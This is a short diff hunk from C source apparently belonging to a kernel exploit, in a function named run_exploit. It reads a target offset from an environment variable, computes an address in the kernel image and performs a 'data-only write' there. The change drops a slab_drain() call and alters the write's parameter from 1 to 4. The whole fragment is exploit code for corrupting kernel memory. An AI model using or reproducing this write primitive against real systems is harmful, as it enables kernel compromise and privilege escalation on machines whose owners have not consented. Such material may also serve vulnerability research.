@@ -1177,8 +1177,7 @@ int run_exploit(int argc, char **argv) {
     unsigned long toff = env_ulong("DATAONLY_TARGET", 0x2a793c8);
     uintptr_t dtgt = data_addr(KIMAGE_TEXT_BASE + toff);
     pr_info("DATAONLY target=%016zx\n", dtgt);
-    slab_drain();
-    do_one_write(dtgt, "data-only write", 1);
+    do_one_write(dtgt, "data-only write", 4);
     pr_info("DATAONLY done\n");
     return 0;
   }
